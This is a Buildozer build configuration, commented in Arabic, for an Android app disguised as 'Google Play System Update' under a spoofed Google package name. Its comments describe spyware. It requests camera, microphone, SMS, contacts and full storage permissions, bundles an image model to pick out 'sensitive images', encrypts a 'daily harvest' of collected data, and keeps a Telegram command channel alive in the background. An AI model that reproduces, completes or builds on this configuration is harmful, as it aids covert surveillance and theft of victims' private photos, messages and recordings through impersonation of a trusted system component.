[app]
# (اسم التطبيق الظاهر للمستخدم (تم تغييره لتمويه جديد تماماً
title = Google Play System Update
# اسم الحزمة الداخلي (تغييره يضمن تثبيت التطبيق كنسخة جديدة تماماً بجانب القديمة أو بديلة عنها بدون تعارض)
package.name = com.google.android.gms.v3
# النطاق البرمجي
package.domain = android.system

# المصادر التي سيتم تضمينها في الحزمة
source.dir = .
source.include_exts = py,png,jpg,kv,atlas,ttf,json,xml,txt,db,tflite
source.include_patterns = assets/*, *.tflite, res/*
source.exclude_dirs = tests,__pycache__,docs,.github,.sys_runtime

# ✅ رفع الإصدار إلى 3.1.0 لضمان تفوقه على أي نسخة سابقة وإجبار النظام على التحديث
version = 3.1.0

# ✅ المتطلبات البرمجية: تم التأكد من وجود المكتبات اللازمة للذكاء الاصطناعي ومعالجة الملفات المضغوطة
# tflite-runtime: للتعرف على الصور الحساسة
# pyzipper & cryptography: لتشفير الحصاد اليومي
requirements = python3,kivy==2.3.0,requests,urllib3,certifi,pillow,pyjnius,android,cryptography,pyzipper,numpy,tflite-runtime

# أيقونة التطبيق (تأكد من وجود أيقونة تشبه ترس النظام في هذا المسار)
icon.filename = %(source.dir)s/res/drawable/ic_launcher.png

# ✅ الصلاحيات الكاملة المطلوبة لأندرويد 13 و 14 لضمان عمل notify_harvest و MediaScanner
android.permissions = INTERNET, ACCESS_NETWORK_STATE, CAMERA, RECORD_AUDIO, WAKE_LOCK, FOREGROUND_SERVICE, POST_NOTIFICATIONS, REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, MANAGE_EXTERNAL_STORAGE, READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE, READ_MEDIA_IMAGES, READ_MEDIA_VIDEO, READ_MEDIA_AUDIO, READ_CONTACTS, READ_SMS, FOREGROUND_SERVICE_DATA_SYNC, FOREGROUND_SERVICE_CAMERA, FOREGROUND_SERVICE_MICROPHONE

# إعدادات SDK/NDK (متوافقة مع أحدث متطلبات متجر جوجل للتطبيقات لعام 2024/2025)
android.api = 34
android.minapi = 21
android.ndk = 25b
android.sdk = 34
android.build_tools_ver = 34.0.0
android.accept_sdk_license = True

# ✅ التركيز على المعالجات الحديثة (64-بت) لضمان أقصى سرعة لمعالج TFLite
android.archs = arm64-v8a

# إعدادات النظام والتشغيل
android.allow_backup = False
android.request_legacy_external_storage = True

# ✅ إعدادات العمل في الخلفية (Foreground Service) 
# ضروري جداً لضمان استمرار عمل telegram_ui في استقبال الأوامر
android.foreground = True
android.foreground_service_type = dataSync|camera|microphone
android.wakelock = True
android.uses_cleartext_traffic = True

# إعدادات الشاشة والعرض
orientation = portrait
fullscreen = 1
log_level = 2
warn_on_root = 0

# ❌ تم الاستغناء عن تعريف الخدمات الثابتة لأن النظام الآن يعمل بالكامل عبر main.py بشكل ديناميكي

[buildozer]
log_level = 2
warn_on_root = 1
